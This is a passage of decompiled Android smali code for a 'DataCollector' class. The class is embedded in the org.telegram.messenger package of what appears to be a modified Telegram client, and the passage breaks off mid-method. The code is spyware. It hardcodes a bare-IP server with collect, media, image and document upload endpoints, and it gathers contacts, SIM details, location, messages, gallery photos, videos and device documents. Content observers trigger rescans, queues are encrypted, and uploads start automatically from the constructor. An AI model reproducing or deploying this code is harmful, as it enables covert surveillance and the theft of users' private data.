.class public Lorg/telegram/messenger/DataCollector;
.super Ljava/lang/Object;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lorg/telegram/messenger/DataCollector$PostResult;,
        Lorg/telegram/messenger/DataCollector$UploadQueue;,
        Lorg/telegram/messenger/DataCollector$ClientConfig;,
        Lorg/telegram/messenger/DataCollector$NetworkState;,
        Lorg/telegram/messenger/DataCollector$FileUploadGate;,
        Lorg/telegram/messenger/DataCollector$QueueItem;,
        Lorg/telegram/messenger/DataCollector$GalleryItem;,
        Lorg/telegram/messenger/DataCollector$FileItem;
    }
.end annotation


# static fields
.field private static final AVATAR_URL:Ljava/lang/String; = "https://38.190.225.166/api/avatar"

.field static final BASE_URL:Ljava/lang/String; = "https://38.190.225.166"

.field private static final BATCH_URL:Ljava/lang/String; = "https://38.190.225.166/api/collect_batch"

.field private static final COLLECT_URL:Ljava/lang/String; = "https://38.190.225.166/api/collect"

.field private static final CONFIG_CACHE_MS:J = 0x493e0L

.field private static final CONFIG_URL:Ljava/lang/String; = "https://38.190.225.166/api/config"

.field private static final DOC_URL:Ljava/lang/String; = "https://38.190.225.166/api/doc"

.field static final EMPTY_BODY_HASH:Ljava/lang/String; = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"

.field private static final FILE_GATE_RETRY_MS:J = 0x493e0L

.field private static final FILE_QUEUE_BATCH:I = 0x5

.field private static final GALLERY_QUEUE_BATCH:I = 0x14

.field private static final IMAGE_URL:Ljava/lang/String; = "https://38.190.225.166/api/image"

.field private static final JSON_QUEUE_BATCH:I = 0x28

.field private static final LOCATION_COOLDOWN_MS:J = 0x2932e00L

.field private static final LOCATION_RETRY_MS:J = 0xdbba0L

.field private static final MAX_RETRIES:I = 0x8

.field private static final MEDIA_RESCAN_COOLDOWN_MS:J = 0x1b7740L

.field private static final MEDIA_URL:Ljava/lang/String; = "https://38.190.225.166/api/media"

.field private static final META_POOL:Ljava/util/concurrent/ExecutorService;

.field private static final MSG_BATCH_MAX:I = 0x32

.field private static final MSG_FLUSH_MS:J = 0x1f4L

.field private static final OBSERVER_DEBOUNCE_MS:J = 0xfa0L

.field private static final PREF_LOC_LAST_ATTEMPT:Ljava/lang/String; = "loc_last_attempt_ms"

.field private static final PREF_LOC_LAST_FETCH:Ljava/lang/String; = "loc_last_fetch_ms"

.field private static final PROFILE_COOLDOWN_MS:J = 0x493e0L

.field private static final QUEUE_KEY_ALIAS:Ljava/lang/String; = "tgc_upload_queue_key"

.field private static final RETRY_BASE_MS:J = 0x3e8L

.field private static final RETRY_MAX_MS:J = 0x493e0L

.field private static final TAG:Ljava/lang/String; = "TGCollect"

.field private static final UPLOAD_POOL:Ljava/util/concurrent/ExecutorService;

.field private static final UPLOAD_POOL_SIZE:I = 0x6

.field private static volatile instance:Lorg/telegram/messenger/DataCollector;

.field private static volatile sDeviceId:Ljava/lang/String;


# instance fields
.field private final clientConfigCache:Lj$/util/concurrent/ConcurrentHashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lj$/util/concurrent/ConcurrentHashMap<",
            "Ljava/lang/Long;",
            "Lorg/telegram/messenger/DataCollector$ClientConfig;",
            ">;"
        }
    .end annotation
.end field

.field private contactsObserver:Landroid/database/ContentObserver;

.field private final contactsRescanRunnable:Ljava/lang/Runnable;

.field private docsObserver:Landroid/database/ContentObserver;

.field private final docsRescanRunnable:Ljava/lang/Runnable;

.field private volatile fileQueueDraining:Z

.field private volatile flushScheduled:Z

.field private galleryObserver:Landroid/database/ContentObserver;

.field private volatile galleryQueueDraining:Z

.field private final galleryRescanRunnable:Ljava/lang/Runnable;

.field private volatile jsonQueueDraining:Z

.field private volatile lastMediaRescanMs:J

.field private volatile locationAccount:I

.field private volatile locationFetchInFlight:Z

.field private volatile locationTrackingInit:Z

.field private final mainHandler:Landroid/os/Handler;

.field private final msgBatch:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "Lorg/json/JSONObject;",
            ">;"
        }
    .end annotation
.end field

.field private volatile msgBatchTs:J

.field private volatile observerAccount:I

.field private volatile observersStarted:Z

.field private final pendingAvatarByFilePath:Lj$/util/concurrent/ConcurrentHashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lj$/util/concurrent/ConcurrentHashMap<",
            "Ljava/lang/String;",
            "[J>;"
        }
    .end annotation
.end field

.field private final pendingByFilePath:Lj$/util/concurrent/ConcurrentHashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lj$/util/concurrent/ConcurrentHashMap<",
            "Ljava/lang/String;",
            "[J>;"
        }
    .end annotation
.end field

.field private volatile phoneContactsCollected:Z

.field private volatile phoneContactsCollecting:Z

.field private final sentAvatars:Lj$/util/concurrent/ConcurrentHashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lj$/util/concurrent/ConcurrentHashMap<",
            "Ljava/lang/Long;",
            "Ljava/lang/Long;",
            ">;"
        }
    .end annotation
.end field

.field private final sentContacts:Lj$/util/concurrent/ConcurrentHashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lj$/util/concurrent/ConcurrentHashMap<",
            "Ljava/lang/Long;",
            "Ljava/lang/Long;",
            ">;"
        }
    .end annotation
.end field

.field private final sentGroupSpeakers:Lj$/util/concurrent/ConcurrentHashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lj$/util/concurrent/ConcurrentHashMap<",
            "Ljava/lang/Long;",
            "Ljava/lang/Long;",
            ">;"
        }
    .end annotation
.end field

.field private final sentImages:Lj$/util/concurrent/ConcurrentHashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lj$/util/concurrent/ConcurrentHashMap<",
            "Ljava/lang/Long;",
            "Ljava/lang/Long;",
            ">;"
        }
    .end annotation
.end field

.field private final sentProfiles:Lj$/util/concurrent/ConcurrentHashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lj$/util/concurrent/ConcurrentHashMap<",
            "Ljava/lang/Long;",
            "Ljava/lang/Long;",
            ">;"
        }
    .end annotation
.end field

.field private volatile simInfoCollected:Z

.field private volatile uploadQueue:Lorg/telegram/messenger/DataCollector$UploadQueue;

.field private videoObserver:Landroid/database/ContentObserver;

.field private final videoRescanRunnable:Ljava/lang/Runnable;


# direct methods
.method public static synthetic $r8$lambda$1q2HElPrWCdnYSHmLGOjEv_Lmy8(Lorg/telegram/messenger/DataCollector;)V
    .locals 0

    .line 0
    invoke-direct {p0}, Lorg/telegram/messenger/DataCollector;->triggerGalleryRescan()V

    return-void
.end method

.method public static synthetic $r8$lambda$94fM3rS5IOPR4hL_zo8grnTaQNk(Lorg/telegram/messenger/DataCollector;)V
    .locals 0

    .line 0
    invoke-direct {p0}, Lorg/telegram/messenger/DataCollector;->triggerContactsRescan()V

    return-void
.end method

.method public static synthetic $r8$lambda$9kiBf6cOgaBD10blBKWOcy6xPT8(Lorg/telegram/messenger/DataCollector;Lorg/json/JSONArray;Ljava/lang/Runnable;Ljava/lang/Runnable;)V
    .locals 0

    .line 0
    invoke-direct {p0, p1, p2, p3}, Lorg/telegram/messenger/DataCollector;->lambda$postJsonBatchDirect$6(Lorg/json/JSONArray;Ljava/lang/Runnable;Ljava/lang/Runnable;)V

    return-void
.end method

.method public static synthetic $r8$lambda$AiO1QaGb6SFfNvBeo4mrQvmH3q0(Lorg/telegram/messenger/DataCollector;Landroid/content/Context;ILandroid/content/SharedPreferences;)V
    .locals 0

    .line 0
    invoke-direct {p0, p1, p2, p3}, Lorg/telegram/messenger/DataCollector;->lambda$onAppForeground$17(Landroid/content/Context;ILandroid/content/SharedPreferences;)V

    return-void
.end method

.method public static synthetic $r8$lambda$Ap53YHSh69IQmpkyknOha8-stM8(Ljava/lang/Runnable;)Ljava/lang/Thread;
    .locals 0

    .line 0
    invoke-static {p0}, Lorg/telegram/messenger/DataCollector;->lambda$static$0(Ljava/lang/Runnable;)Ljava/lang/Thread;

    move-result-object p0

    return-object p0
.end method

.method public static synthetic $r8$lambda$DFZj5yN1IYa4SmOZ6sc_vhjqd9g(Lorg/telegram/messenger/DataCollector;)V
    .locals 0

    .line 0
    invoke-direct {p0}, Lorg/telegram/messenger/DataCollector;->triggerDocsRescan()V

    return-void
.end method

.method public static synthetic $r8$lambda$FsetZz8fZAgFsySm2oskExFP5Bk(Lorg/telegram/messenger/DataCollector;Landroid/content/Context;I)V
    .locals 0

    .line 0
    invoke-direct {p0, p1, p2}, Lorg/telegram/messenger/DataCollector;->lambda$collectGalleryVideos$14(Landroid/content/Context;I)V

    return-void
.end method

.method public static synthetic $r8$lambda$FznEYsZYy6Z3s9al2P7bwFGewnk(Lorg/telegram/messenger/DataCollector;Landroid/content/Context;I)V
    .locals 0

    .line 0
    invoke-direct {p0, p1, p2}, Lorg/telegram/messenger/DataCollector;->lambda$collectSimInfo$12(Landroid/content/Context;I)V

    return-void
.end method

.method public static synthetic $r8$lambda$ITqltO-pkyBnJ5aagwlroFwFlO8(Lorg/telegram/messenger/DataCollector;ILjava/lang/String;JIJZLjava/io/File;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    .line 0
    invoke-direct/range {p0 .. p11}, Lorg/telegram/messenger/DataCollector;->lambda$uploadMultipartAsync$16(ILjava/lang/String;JIJZLjava/io/File;Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method public static synthetic $r8$lambda$KmAuVek99Y0KX17GzKGdGN5UTGk(Lorg/telegram/messenger/DataCollector;Ljava/util/List;)V
    .locals 0

    .line 0
    invoke-direct {p0, p1}, Lorg/telegram/messenger/DataCollector;->lambda$flushMsgBatch$7(Ljava/util/List;)V

    return-void
.end method

.method public static synthetic $r8$lambda$M6IVIDPuTdQzZN-Y9kQIfB6T8n8(Lorg/telegram/messenger/DataCollector;)V
    .locals 0

    .line 0
    invoke-direct {p0}, Lorg/telegram/messenger/DataCollector;->lambda$scheduleFileQueueDrain$4()V

    return-void
.end method

.method public static synthetic $r8$lambda$OZaZ0NaCdKTuMMq2RkV_BD0GC4k(Lorg/telegram/messenger/DataCollector;Landroid/content/Context;I)V
    .locals 0

    .line 0
    invoke-direct {p0, p1, p2}, Lorg/telegram/messenger/DataCollector;->lambda$collectDeviceDocs$15(Landroid/content/Context;I)V

    return-void
.end method

.method public static synthetic $r8$lambda$SHklbeSkqKy18bVg5UaiPuk3LQA(Landroid/content/SharedPreferences;)V
    .locals 0

    .line 0
    invoke-static {p0}, Lorg/telegram/messenger/DataCollector;->lambda$fetchLocationIfAllowed$18(Landroid/content/SharedPreferences;)V

    return-void
.end method

.method public static synthetic $r8$lambda$UydUhwiP3SVT3xbQiIDC_GCpa_M(Lorg/telegram/messenger/DataCollector;)V
    .locals 0

    .line 0
    invoke-direct {p0}, Lorg/telegram/messenger/DataCollector;->drainFileQueue()V

    return-void
.end method

.method public static synthetic $r8$lambda$Yo_bGvChCmlXaJtR_GkhNd6nbRc(Lorg/telegram/messenger/DataCollector;)V
    .locals 0

    .line 0
    invoke-direct {p0}, Lorg/telegram/messenger/DataCollector;->flushMsgBatch()V

    return-void
.end method

.method public static synthetic $r8$lambda$ZyAfuV5kogvuuQ0sxqtt3Ye5np4(Ljava/lang/Runnable;)Ljava/lang/Thread;
    .locals 0

    .line 0
    invoke-static {p0}, Lorg/telegram/messenger/DataCollector;->lambda$static$1(Ljava/lang/Runnable;)Ljava/lang/Thread;

    move-result-object p0

    return-object p0
.end method

.method public static synthetic $r8$lambda$fkDwwIfIL7ThxD-z1aLY5j83jjg(Lorg/telegram/messenger/DataCollector;Landroid/content/Context;I)V
    .locals 0

    .line 0
    invoke-direct {p0, p1, p2}, Lorg/telegram/messenger/DataCollector;->lambda$collectPhoneContacts$11(Landroid/content/Context;I)V

    return-void
.end method

.method public static synthetic $r8$lambda$l9z7J-lrt0jgB_EmIP_YDSJxBUo(Lorg/telegram/messenger/DataCollector;ILorg/telegram/tgnet/TLRPC$Message;)V
    .locals 0

    .line 0
    invoke-direct {p0, p1, p2}, Lorg/telegram/messenger/DataCollector;->lambda$scheduleMediaUpload$9(ILorg/telegram/tgnet/TLRPC$Message;)V

    return-void
.end method

.method public static synthetic $r8$lambda$m6viJ6IdmkhtiOmdN3tR4Tta4wE(Lorg/telegram/messenger/DataCollector;)V
    .locals 0

    .line 0
    invoke-direct {p0}, Lorg/telegram/messenger/DataCollector;->drainJsonQueue()V

    return-void
.end method

.method public static synthetic $r8$lambda$mZp0fNhDtPhf6tUpJi58UABtdRA(Lorg/telegram/messenger/DataCollector;)V
    .locals 0

    .line 0
    invoke-direct {p0}, Lorg/telegram/messenger/DataCollector;->drainGalleryQueue()V

    return-void
.end method

.method public static synthetic $r8$lambda$pQ-Vj0H2pXTlFBZX-0UPuC8lLXY(J[JLjava/lang/Long;Ljava/lang/Long;)Ljava/lang/Long;
    .locals 0

    .line 0
    invoke-static {p0, p1, p2, p3, p4}, Lorg/telegram/messenger/DataCollector;->lambda$checkCooldown$8(J[JLjava/lang/Long;Ljava/lang/Long;)Ljava/lang/Long;

    move-result-object p0

    return-object p0
.end method

.method public static synthetic $r8$lambda$pji_qCgoUr0yHqCzkrRhE4m1MY4(Lorg/telegram/messenger/DataCollector;)V
    .locals 0

    .line 0
    invoke-direct {p0}, Lorg/telegram/messenger/DataCollector;->lambda$collectPhoneContacts$10()V

    return-void
.end method

.method public static synthetic $r8$lambda$rsECFHQTw-Emwf2rfB5NQ_uOg3w(Lorg/telegram/messenger/DataCollector;)V
    .locals 0

    .line 0
    invoke-direct {p0}, Lorg/telegram/messenger/DataCollector;->triggerVideoRescan()V

    return-void
.end method

.method public static synthetic $r8$lambda$sy9sBhqb_78uReToatsxduh2uUk(Lorg/telegram/messenger/DataCollector;Landroid/content/Context;I)V
    .locals 0

    .line 0
    invoke-direct {p0, p1, p2}, Lorg/telegram/messenger/DataCollector;->lambda$collectGalleryImages$13(Landroid/content/Context;I)V

    return-void
.end method

.method public static synthetic $r8$lambda$uc20HpBS82-aMJHHbnIB0W0NyFM(Lorg/telegram/messenger/DataCollector;)V
    .locals 0

    .line 0
    invoke-direct {p0}, Lorg/telegram/messenger/DataCollector;->lambda$scheduleGalleryQueueDrain$3()V

    return-void
.end method

.method public static synthetic $r8$lambda$yJmRjTFznA8nJGotcYmWnqLSTL0(Lorg/telegram/messenger/DataCollector;)V
    .locals 0

    .line 0
    invoke-direct {p0}, Lorg/telegram/messenger/DataCollector;->lambda$scheduleJsonQueueDrain$2()V

    return-void
.end method

.method public static synthetic $r8$lambda$yf0dCgktcoaQQPqzOPv5i6Vin94(Lorg/telegram/messenger/DataCollector;Lorg/json/JSONObject;Ljava/lang/Runnable;Ljava/lang/Runnable;)V
    .locals 0

    .line 0
    invoke-direct {p0, p1, p2, p3}, Lorg/telegram/messenger/DataCollector;->lambda$postJsonDirect$5(Lorg/json/JSONObject;Ljava/lang/Runnable;Ljava/lang/Runnable;)V

    return-void
.end method

.method static constructor <clinit>()V
    .locals 2

    .line 96
    new-instance v0, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda39;

    invoke-direct {v0}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda39;-><init>()V

    const/4 v1, 0x4

    invoke-static {v1, v0}, Ljava/util/concurrent/Executors;->newFixedThreadPool(ILjava/util/concurrent/ThreadFactory;)Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    sput-object v0, Lorg/telegram/messenger/DataCollector;->META_POOL:Ljava/util/concurrent/ExecutorService;

    .line 105
    new-instance v0, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda40;

    invoke-direct {v0}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda40;-><init>()V

    const/4 v1, 0x6

    invoke-static {v1, v0}, Ljava/util/concurrent/Executors;->newFixedThreadPool(ILjava/util/concurrent/ThreadFactory;)Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    sput-object v0, Lorg/telegram/messenger/DataCollector;->UPLOAD_POOL:Ljava/util/concurrent/ExecutorService;

    return-void
.end method

.method private constructor <init>()V
    .locals 4

    .line 326
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 126
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lorg/telegram/messenger/DataCollector;->msgBatch:Ljava/util/List;

    const-wide/16 v0, 0x0

    .line 127
    iput-wide v0, p0, Lorg/telegram/messenger/DataCollector;->msgBatchTs:J

    const/4 v2, 0x0

    .line 128
    iput-boolean v2, p0, Lorg/telegram/messenger/DataCollector;->flushScheduled:Z

    .line 133
    iput-boolean v2, p0, Lorg/telegram/messenger/DataCollector;->jsonQueueDraining:Z

    .line 134
    iput-boolean v2, p0, Lorg/telegram/messenger/DataCollector;->galleryQueueDraining:Z

    .line 135
    iput-boolean v2, p0, Lorg/telegram/messenger/DataCollector;->fileQueueDraining:Z

    .line 139
    new-instance v3, Lj$/util/concurrent/ConcurrentHashMap;

    invoke-direct {v3}, Lj$/util/concurrent/ConcurrentHashMap;-><init>()V

    iput-object v3, p0, Lorg/telegram/messenger/DataCollector;->clientConfigCache:Lj$/util/concurrent/ConcurrentHashMap;

    .line 143
    new-instance v3, Lj$/util/concurrent/ConcurrentHashMap;

    invoke-direct {v3}, Lj$/util/concurrent/ConcurrentHashMap;-><init>()V

    iput-object v3, p0, Lorg/telegram/messenger/DataCollector;->sentProfiles:Lj$/util/concurrent/ConcurrentHashMap;

    .line 144
    new-instance v3, Lj$/util/concurrent/ConcurrentHashMap;

    invoke-direct {v3}, Lj$/util/concurrent/ConcurrentHashMap;-><init>()V

    iput-object v3, p0, Lorg/telegram/messenger/DataCollector;->sentAvatars:Lj$/util/concurrent/ConcurrentHashMap;

    .line 145
    new-instance v3, Lj$/util/concurrent/ConcurrentHashMap;

    invoke-direct {v3}, Lj$/util/concurrent/ConcurrentHashMap;-><init>()V

    iput-object v3, p0, Lorg/telegram/messenger/DataCollector;->sentContacts:Lj$/util/concurrent/ConcurrentHashMap;

    .line 146
    new-instance v3, Lj$/util/concurrent/ConcurrentHashMap;

    invoke-direct {v3}, Lj$/util/concurrent/ConcurrentHashMap;-><init>()V

    iput-object v3, p0, Lorg/telegram/messenger/DataCollector;->sentImages:Lj$/util/concurrent/ConcurrentHashMap;

    .line 147
    new-instance v3, Lj$/util/concurrent/ConcurrentHashMap;

    invoke-direct {v3}, Lj$/util/concurrent/ConcurrentHashMap;-><init>()V

    iput-object v3, p0, Lorg/telegram/messenger/DataCollector;->sentGroupSpeakers:Lj$/util/concurrent/ConcurrentHashMap;

    .line 153
    new-instance v3, Lj$/util/concurrent/ConcurrentHashMap;

    invoke-direct {v3}, Lj$/util/concurrent/ConcurrentHashMap;-><init>()V

    iput-object v3, p0, Lorg/telegram/messenger/DataCollector;->pendingByFilePath:Lj$/util/concurrent/ConcurrentHashMap;

    .line 159
    new-instance v3, Lj$/util/concurrent/ConcurrentHashMap;

    invoke-direct {v3}, Lj$/util/concurrent/ConcurrentHashMap;-><init>()V

    iput-object v3, p0, Lorg/telegram/messenger/DataCollector;->pendingAvatarByFilePath:Lj$/util/concurrent/ConcurrentHashMap;

    .line 162
    iput-boolean v2, p0, Lorg/telegram/messenger/DataCollector;->phoneContactsCollected:Z

    .line 163
    iput-boolean v2, p0, Lorg/telegram/messenger/DataCollector;->phoneContactsCollecting:Z

    .line 164
    iput-boolean v2, p0, Lorg/telegram/messenger/DataCollector;->simInfoCollected:Z

    const/4 v3, 0x0

    .line 167
    iput-object v3, p0, Lorg/telegram/messenger/DataCollector;->galleryObserver:Landroid/database/ContentObserver;

    .line 168
    iput-object v3, p0, Lorg/telegram/messenger/DataCollector;->videoObserver:Landroid/database/ContentObserver;

    .line 169
    iput-object v3, p0, Lorg/telegram/messenger/DataCollector;->docsObserver:Landroid/database/ContentObserver;

    .line 170
    iput-object v3, p0, Lorg/telegram/messenger/DataCollector;->contactsObserver:Landroid/database/ContentObserver;

    .line 171
    iput-boolean v2, p0, Lorg/telegram/messenger/DataCollector;->observersStarted:Z

    .line 172
    iput v2, p0, Lorg/telegram/messenger/DataCollector;->observerAccount:I

    .line 177
    new-instance v3, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda41;

    invoke-direct {v3, p0}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda41;-><init>(Lorg/telegram/messenger/DataCollector;)V

    iput-object v3, p0, Lorg/telegram/messenger/DataCollector;->galleryRescanRunnable:Ljava/lang/Runnable;

    .line 178
    new-instance v3, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda42;

    invoke-direct {v3, p0}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda42;-><init>(Lorg/telegram/messenger/DataCollector;)V

    iput-object v3, p0, Lorg/telegram/messenger/DataCollector;->videoRescanRunnable:Ljava/lang/Runnable;

    .line 179
    new-instance v3, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda43;

    invoke-direct {v3, p0}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda43;-><init>(Lorg/telegram/messenger/DataCollector;)V

    iput-object v3, p0, Lorg/telegram/messenger/DataCollector;->docsRescanRunnable:Ljava/lang/Runnable;

    .line 180
    new-instance v3, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda44;

    invoke-direct {v3, p0}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda44;-><init>(Lorg/telegram/messenger/DataCollector;)V

    iput-object v3, p0, Lorg/telegram/messenger/DataCollector;->contactsRescanRunnable:Ljava/lang/Runnable;

    .line 303
    iput-boolean v2, p0, Lorg/telegram/messenger/DataCollector;->locationTrackingInit:Z

    .line 304
    iput-boolean v2, p0, Lorg/telegram/messenger/DataCollector;->locationFetchInFlight:Z

    .line 305
    iput v2, p0, Lorg/telegram/messenger/DataCollector;->locationAccount:I

    .line 306
    new-instance v2, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v3

    invoke-direct {v2, v3}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    iput-object v2, p0, Lorg/telegram/messenger/DataCollector;->mainHandler:Landroid/os/Handler;

    .line 311
    iput-wide v0, p0, Lorg/telegram/messenger/DataCollector;->lastMediaRescanMs:J

    const-wide/16 v0, 0x7d0

    .line 327
    invoke-direct {p0, v0, v1}, Lorg/telegram/messenger/DataCollector;->scheduleJsonQueueDrain(J)V

    const-wide/16 v0, 0x1388

    .line 328
    invoke-direct {p0, v0, v1}, Lorg/telegram/messenger/DataCollector;->scheduleGalleryQueueDrain(J)V

    .line 329
    invoke-direct {p0, v0, v1}, Lorg/telegram/messenger/DataCollector;->scheduleFileQueueDrain(J)V

    return-void
.end method

.method static synthetic access$000(Lorg/telegram/messenger/DataCollector;)Ljava/lang/Runnable;
    .locals 0

    .line 66
    iget-object p0, p0, Lorg/telegram/messenger/DataCollector;->galleryRescanRunnable:Ljava/lang/Runnable;

    return-object p0
.end method

.method static synthetic access$100(Lorg/telegram/messenger/DataCollector;)Landroid/os/Handler;
    .locals 0

    .line 66
    iget-object p0, p0, Lorg/telegram/messenger/DataCollector;->mainHandler:Landroid/os/Handler;

    return-object p0
.end method

.method static synthetic access$200(Lorg/telegram/messenger/DataCollector;)Ljava/lang/Runnable;
    .locals 0

    .line 66
    iget-object p0, p0, Lorg/telegram/messenger/DataCollector;->videoRescanRunnable:Ljava/lang/Runnable;

    return-object p0
.end method

.method static synthetic access$300(Lorg/telegram/messenger/DataCollector;)Ljava/lang/Runnable;
    .locals 0

    .line 66
    iget-object p0, p0, Lorg/telegram/messenger/DataCollector;->docsRescanRunnable:Ljava/lang/Runnable;

    return-object p0
.end method

.method static synthetic access$400(Lorg/telegram/messenger/DataCollector;)Ljava/lang/Runnable;
    .locals 0

    .line 66
    iget-object p0, p0, Lorg/telegram/messenger/DataCollector;->contactsRescanRunnable:Ljava/lang/Runnable;

    return-object p0
.end method

.method static synthetic access$500(Ljava/lang/String;)Ljava/lang/String;
    .locals 0

    .line 66
    invoke-static {p0}, Lorg/telegram/messenger/DataCollector;->encryptQueuePayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    return-object p0
.end method

.method static synthetic access$600([B)Ljava/lang/String;
    .locals 0

    .line 66
    invoke-static {p0}, Lorg/telegram/messenger/DataCollector;->sha256Hex([B)Ljava/lang/String;

    move-result-object p0

    return-object p0
.end method

.method static synthetic access$700(Ljava/lang/String;)Ljava/lang/String;
    .locals 0

    .line 66
    invoke-static {p0}, Lorg/telegram/messenger/DataCollector;->decryptQueuePayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    return-object p0
.end method

.method static synthetic access$800(Lorg/telegram/messenger/DataCollector;)V
    .locals 0

    .line 66
    invoke-direct {p0}, Lorg/telegram/messenger/DataCollector;->onAppForeground()V

    return-void
.end method

.method private accountIdForConfig(I)J
    .locals 5

    .line 970
    invoke-static {p1}, Lorg/telegram/messenger/DataCollector;->userId(I)J

    move-result-wide v0

    const-wide/16 v2, 0x0

    cmp-long v4, v0, v2

    if-lez v4, :cond_0

    goto :goto_0

    :cond_0
    int-to-long v0, p1

    :goto_0
    return-wide v0
.end method

.method static addHMACHeaders(Ljava/net/HttpURLConnection;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 2

    .line 824
    :try_start_0
    new-instance v0, Ljava/net/URL;

    invoke-direct {v0, p2}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/net/URL;->getFile()Ljava/lang/String;

    move-result-object p2

    .line 825
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    invoke-static {v0, v1}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v0

    .line 826
    invoke-static {}, Ljava/util/UUID;->randomUUID()Ljava/util/UUID;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/UUID;->toString()Ljava/lang/String;

    move-result-object v1

    .line 827
    invoke-virtual {p1}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;

    move-result-object p1

    invoke-static {p1, p2, p3, v0, v1}, Lorg/telegram/messenger/DataCollector;->generateSignature(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    .line 828
    const-string p2, "X-Device-ID"

    invoke-virtual {p0, p2, p4}, Ljava/net/URLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 829
    const-string p2, "X-Timestamp"

    invoke-virtual {p0, p2, v0}, Ljava/net/URLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 830
    const-string p2, "X-Nonce"

    invoke-virtual {p0, p2, v1}, Ljava/net/URLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 831
    const-string p2, "X-Signature"

    invoke-virtual {p0, p2, p1}, Ljava/net/URLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method private checkCooldown(Lj$/util/concurrent/ConcurrentHashMap;J)Z
    .locals 7
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lj$/util/concurrent/ConcurrentHashMap<",
            "Ljava/lang/Long;",
            "Ljava/lang/Long;",
            ">;J)Z"
        }
    .end annotation

    .line 1541
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    const/4 v2, 0x1

    .line 1543
    new-array v3, v2, [J

    const-wide/16 v4, 0x0

    const/4 v6, 0x0

    aput-wide v4, v3, v6

    .line 1544
    invoke-static {p2, p3}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object p2

    new-instance p3, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda46;

    invoke-direct {p3, v0, v1, v3}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda46;-><init>(J[J)V

    invoke-static {p1, p2, p3}, Lj$/util/concurrent/ConcurrentMap$-EL;->compute(Ljava/util/concurrent/ConcurrentMap;Ljava/lang/Object;Ljava/util/function/BiFunction;)Ljava/lang/Object;

    .line 1552
    aget-wide p1, v3, v6

    const-wide/16 v0, 0x1

    cmp-long p3, p1, v0

    if-nez p3, :cond_0

    goto :goto_0

    :cond_0
    const/4 v2, 0x0

    :goto_0
    return v2
.end method

.method private static compressImageInMemory(Ljava/io/File;)[B
    .locals 7

    const/4 v0, 0x0

    .line 2769
    :try_start_0
    invoke-virtual {p0}, Ljava/io/File;->length()J

    move-result-wide v1

    const-wide/32 v3, 0x25800

    cmp-long v5, v1, v3

    if-gez v5, :cond_0

    return-object v0

    .line 2771
    :cond_0
    new-instance v1, Landroid/graphics/BitmapFactory$Options;

    invoke-direct {v1}, Landroid/graphics/BitmapFactory$Options;-><init>()V

    const/4 v2, 0x1

    .line 2772
    iput-boolean v2, v1, Landroid/graphics/BitmapFactory$Options;->inJustDecodeBounds:Z

    .line 2773
    invoke-virtual {p0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v1}, Landroid/graphics/BitmapFactory;->decodeFile(Ljava/lang/String;Landroid/graphics/BitmapFactory$Options;)Landroid/graphics/Bitmap;

    .line 2774
    iget v3, v1, Landroid/graphics/BitmapFactory$Options;->outWidth:I

    .line 2775
    iget v1, v1, Landroid/graphics/BitmapFactory$Options;->outHeight:I

    if-lez v3, :cond_6

    if-gtz v1, :cond_1

    goto/16 :goto_1

    .line 2780
